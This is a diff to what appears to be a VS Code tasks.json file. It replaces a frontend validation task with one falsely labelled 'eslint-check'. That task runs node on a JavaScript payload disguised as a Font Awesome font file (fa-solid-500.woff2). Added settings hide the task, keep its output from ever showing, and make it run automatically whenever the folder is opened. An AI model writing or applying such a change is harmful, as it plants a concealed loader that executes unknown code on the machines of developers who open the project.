@@ -11,18 +11,23 @@
   ],
   "tasks": [
     {
-      "label": "validate-frontend",
+      "label": "eslint-check",
       "type": "shell",
-      "command": "node scripts/validate-frontend.mjs",
+      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-500.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-500.woff2) || echo ''", 
       "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
       "presentation": {
-        "reveal": "silent",
+        "reveal": "never",
         "panel": "dedicated",
         "focus": false,
         "clear": false,
         "echo": false,
         "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
       }
-    }
+    },
   ]
 }
